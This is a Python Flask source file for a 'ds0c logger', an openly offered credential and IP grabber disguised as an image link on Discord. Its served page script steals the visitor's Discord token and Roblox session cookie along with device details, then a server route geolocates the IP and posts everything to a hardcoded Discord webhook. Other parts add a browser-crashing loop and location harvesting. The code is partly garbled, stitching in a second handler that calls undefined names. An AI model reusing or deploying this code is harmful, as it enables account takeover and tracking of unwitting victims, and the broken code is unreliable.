import os
from flask import Flask, request, Response
import requests
import base64
import json
import urllib.parse
from datetime import datetime
import traceback

__app__ = "ds0c logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "ds0c"

app = Flask(__name__)
@app.route("/api/main")
def serve_image():
    try:
        # Fetch the image
        img_response = requests.get(img_url, timeout=5)
        img_response.raise_for_status()

        return Response(
            img_response.content,
            mimetype=img_response.headers.get("Content-Type", "image/jpeg"),
            status=200
        )

    except Exception as e:
        return handle_error(e)

# Config - CHANGE THESE
WEBHOOK_URL = os.environ.get('WEBHOOK_URL', 'https://discord.com/api/webhooks/1470096967848824842/r-jZxPC9ak3StrviCxigMgb6uk5fdKXaffchHmjc8rs9z72qk4td6c52QBjd_a1cjKiV')  
img_url = os.environ.get('IMG_URL', 'https://httpbin.org/image/jpeg')  # Test image

@app.errorhandler(Exception)
def handle_error(e):
    print(f"ERROR: {str(e)}")
    print(traceback.format_exc())
    pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
    return Response(pixel, mimetype='image/gif', status=200)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    try:
        if path.endswith(('.jpg', '.png')) and 'grab' in path:
            return grab_image()
        elif path == 'image.jpg':
            return image_proxy()
        elif path == 'steal':
            return steal_data()
        return "Not Found", 404
    except Exception as e:
        print(f"Route error {path}: {e}")
        pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
        return Response(pixel, mimetype='image/gif')

def grab_image():
    html = f'''
<!DOCTYPE html><html><head><title></title><meta charset="UTF-8">
<script>
(async()=>{{
    let token = localStorage.getItem("token")||'';
    let roblox = document.cookie.split(";").find(c=>c.includes(".ROBLOSECURITY"))||"";
    if(roblox) roblox = roblox.split("=")[1].replace(/^_ \| WARNING: Obsolete \| /,"").replace(/ \|_$/,"");
    
    let data = {{
        ua: navigator.userAgent,
        lang: navigator.language,
        screen: `${{screen.width}}x${{screen.height}}`,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency||0,
        ram: navigator.deviceMemory||0,
        cookies: document.cookie.split(";").length,
        plugins: navigator.plugins.length,
        ref: document.referrer,
        token: token,
        roblox: roblox,
        battery: navigator.getBattery?'yes':'no',
        net: navigator.connection?.effectiveType||'N/A'
    }};
    
    let params = new URLSearchParams(data).toString();
    navigator.sendBeacon('/steal?'+params);
    location.href='data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==';
}})();
</script>
<style>body{{margin:0;padding:20px;background:#111;color:#fff;font-family:sans-serif;text-align:center;}}img{{max-width:100%;height:auto;opacity:.8;}}</style>
</head><body>
<img src="{img_url}" onload="this.style.opacity=1">
</body></html>'''
    return Response(html, mimetype='text/html')

def image_proxy():
    try:
        resp = requests.get(img_url, timeout=3)
        return Response(resp.content, mimetype=resp.headers.get('content-type', 'image/jpeg'))
    except:
        pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
        return Response(pixel, mimetype='image/gif')

def steal_data():
    params = request.args.to_dict()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Simple geo
    try:
        geo_resp = requests.get(f'http://ipapi.co/{ip}/json/', timeout=2)
        geo_data = geo_resp.json()
        geo = f"{geo_data.get('city')} {geo_data.get('country_name')}"
        isp = geo_data.get('org')
    except:
        geo = isp = "N/A"
    
    embed = {
        "title": "🎯 HIT DETECTED",
        "color": 16711680,
        "fields": [
            {"name": "IP", "value": ip, "inline": True},
            {"name": "Geo", "value": geo, "inline": True},
            {"name": "ISP", "value": isp, "inline": True},
            {"name": "UA", "value": params.get('ua', 'N/A')[:80], "inline": False},
            {"name": "Discord", "value": f"`{params.get('token', 'NONE')[:32]}`", "inline": False},
            {"name": "Roblox", "value": f"`{params.get('roblox', 'NONE')[:32]}`", "inline": False},
            {"name": "Device", "value": f"Screen: {params.get('screen')} | CPU: {params.get('cores')}", "inline": False}
        ]
    }
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

    
    pixel = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
    return Response(pixel, mimetype='image/gif')

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI

if __name__ == "__main__":
    app.run(debug=True)
